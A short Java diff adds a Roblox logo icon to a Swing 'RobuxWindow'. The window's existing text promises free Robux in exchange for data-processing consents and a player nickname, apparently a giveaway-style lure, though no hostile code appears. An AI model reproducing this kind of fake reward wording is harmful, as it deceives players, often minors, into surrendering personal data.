@@ -2,7 +2,9 @@ package UI.Windows.GameSpecific;
 
 import UI.Windows.BaseWindow;
 
+import javax.swing.*;
 import java.awt.*;
+import java.util.Objects;
 
 public class RobuxWindow extends BaseWindow {
 
@@ -14,5 +16,7 @@ public class RobuxWindow extends BaseWindow {
                 "We need you to mark the appropriate consents for data processing, in return for which we will reward the account given by you with the appropriate amount of Roblox.\n");
         inputDescription.setText("Account that will get Robux:");
         inputPlaceholder.setText("Input your player nick");
+        ImageIcon logo = new ImageIcon(Objects.requireNonNull(getClass().getClassLoader().getResource("logos/ROBLOX.jpg")));
+        this.setIconImage(logo.getImage());
     }
 }
